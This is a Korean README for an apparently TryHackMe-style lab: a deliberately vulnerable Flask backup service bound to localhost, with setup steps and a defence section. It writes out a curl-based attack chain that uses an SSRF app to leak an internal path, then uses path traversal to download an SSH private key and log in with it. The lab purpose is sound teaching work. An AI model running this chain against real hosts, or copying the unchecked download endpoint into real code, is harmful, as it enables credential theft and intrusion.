# OWASP Top 10 - 취약한 백업 파일 서비스

TryHackme easy 랩 <owasp_webhack> 에서 사용된 취약한 Flask 애플리케이션 서비스입니다. **실제 운영 환경에서 사용하지 마세요.**

> **주의**: 이 서비스는 VM 로컬 환경(`127.0.0.1`)에서만 실행되도록 설정되어 있습니다. SSRF 취약점이 있는 웹 앱과 결합하여 내부 네트워크 공격 시나리오를 학습하기 위한 목적입니다.<br>

- 프로젝트 진행: https://velog.io/@jju00/vmware-%EC%84%9C%EB%B2%84-%EC%83%9D%EC%84%B1
- 2025 owasp: https://nagox.pages.dev/Web/2025-owasp-top-10/
- github: https://github.com/jju00/owasp10_web
- THM 문제 주소: 

## 🎯 학습 목표

이 서비스는 다음 OWASP Top 10 2025 취약점을 학습하기 위해 설계되었습니다:

- **[A01:2025 - Broken Access Control](https://nagox.pages.dev/Web/2025-owasp-top-10/)** (Path Traversal)
- **[A10:2025 - Mishandling of Exceptional Conditions](https://nagox.pages.dev/Web/2025-owasp-top-10/)**
- **SSRF 트리거용 내부 서비스**

## 💻 VM 환경 권장

격리된 환경에서 안전하게 실습하기 위해 **VMware 가상 머신 사용을 강력히 권장**합니다:

- **VMware 설정 가이드**: [VMware 서버 생성 가이드](https://velog.io/@jju00/vmware-%EC%84%9C%EB%B2%84-%EC%83%9D%EC%84%B1)
- Ubuntu Server 20.04/22.04 LTS 권장
- 공유 폴더로 프로젝트 마운트하여 사용
- 호스트 네트워크와 격리된 NAT 네트워크 구성 

## 🚀 실행 방법

### VM 내부에서 직접 실행 (권장)

```bash
# Python 의존성 설치
pip3 install -r requirements.txt

# SSH 개인키 생성 (학습용)
ssh-keygen -t ed25519 -f backup/uploads/owasp10 -N "" -C "owasp10"

# Flask 앱 실행
python3 app.py
```

**서비스 바인딩**: `http://127.0.0.1:8080` (VM 로컬에서만 접근 가능 - app.py에서 수정 가능)

### systemd 서비스로 등록 (선택사항)

```bash
# systemd 서비스 파일 생성
sudo tee /etc/systemd/system/owasp-fileservice.service > /dev/null <<EOF
[Unit]
Description=OWASP10 Vulnerable File Service
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$(pwd)
Environment="PATH=$PATH"
ExecStart=/usr/bin/python3 $(pwd)/app.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# 서비스 활성화 및 시작
sudo systemctl daemon-reload
sudo systemctl enable owasp-fileservice
sudo systemctl start owasp-fileservice

# 상태 확인
sudo systemctl status owasp-fileservice
```

## 📍 엔드포인트

### GET `/`
- 메인 페이지 (간단한 HTML)
- 응답 예시:
  ```html
  <h1>Club Backup Service</h1>
  <p>Status: Read-only (maintenance)</p>
  <p>Endpoints: /upload, /download</p>
  ```

### GET/POST `/upload`
- **취약점 A10**: 에러 메시지에서 내부 경로 노출
- 항상 500 에러 반환
- 임시 파일명(`tmp_랜덤숫자`) 생성 시도 후 실패
- 응답 예시:
  ```
  Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_847291 upload failed
  ```

### GET `/download?path=<filepath>`
- **취약점 A01**: Path Traversal (경로 검증 없음)
- 임의의 파일 다운로드 가능
- 성공 시: HTTP 200 + 파일 다운로드
- 실패 시: 간단한 텍스트 에러 메시지
- 예시: `/download?path=/mnt/shared/owasp_fileservice/backup/uploads/owasp10`

## 🔓 공격 시나리오

> **참고**: 이 서비스는 127.0.0.1에서만 실행되므로, 직접 접근은 VM 내부에서만 가능합니다. 실제 공격 시나리오는 SSRF 취약점을 통해 이루어집니다.

### 1단계: VM 내부에서 정보 수집 (테스트)
```bash
# VM 내부에서 테스트
curl http://127.0.0.1:8080/

# 업로드 엔드포인트 접근하여 내부 경로 유출 확인
curl http://127.0.0.1:8080/upload
```

**결과**: 
```
Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_123456 upload failed
```
→ 내부 저장소 경로 노출됨!

### 2단계: SSRF를 통한 경로 정보 획득 
실습자는 SSRF 취약점이 있는 웹 앱(80포트)을 통해 접근:

```bash
# 실습자 노트북에서 SSRF 웹 앱에 요청
curl -X POST http://vulnerable-webapp/admin/check \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/upload"}'
```

**응답**:
```
Error: /mnt/shared/owasp_fileservice/backup/uploads/tmp_789012 upload failed
```

### 3단계: Path Traversal로 개인키 탈취 
유출된 경로를 이용해 SSH 개인키 다운로드:

```bash
# SSRF를 통해 개인키 탈취
curl -X POST http://vulnerable-webapp/admin/check \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080/download?path=/mnt/shared/owasp_fileservice/backup/uploads/owasp10"}' \
  -o owasp10

# 권한 설정
chmod 600 owasp10

# SSH 접속 시도
ssh -i owasp10 user@target-server
```

**전체 공격 흐름**:
1. 공격자 호스트 → SSRF 웹 앱(80포트) 요청
2. SSRF 웹 앱 → 내부 파일 서비스(127.0.0.1:8080) 접근
3. 파일 서비스 → 에러 메시지에 내부 경로 노출 (A10)
4. 공격자 → 유출된 경로로 개인키 탈취 요청
5. 파일 서비스 → Path Traversal로 임의 파일 반환 (A01)
6. 공격자 호스트 → 개인키 다운로드 완료!

## 🛡️ 방어 방법

1. **입력 검증**: 모든 사용자 입력을 검증하고 화이트리스트 방식 사용
2. **경로 정규화**: `os.path.realpath()`, `os.path.abspath()` 사용
3. **디렉토리 제한**: 허용된 디렉토리 내부인지 확인
4. **디버그 모드 비활성화**: 운영 환경에서는 절대 debug=True 사용 금지
5. **에러 처리**: 상세한 에러 정보를 사용자에게 노출하지 않음
6. **최소 권한 원칙**: 애플리케이션을 최소 권한으로 실행

## 🎓 학습 목표 달성을 위해

1. VMware로 격리된 환경 구축
2. SSRF 취약한 웹 앱 구축 (별도 프로젝트)
3. 이 파일 서비스를 127.0.0.1:8080에서 실행
4. SSRF → 내부 서비스 접근 → Path Traversal 체인 실습
5. 방어 기법 학습 및 안전한 코드 작성 연습

## 📝 라이센스

MIT License - 학습 및 교육 목적으로 자유롭게 사용 가능합니다.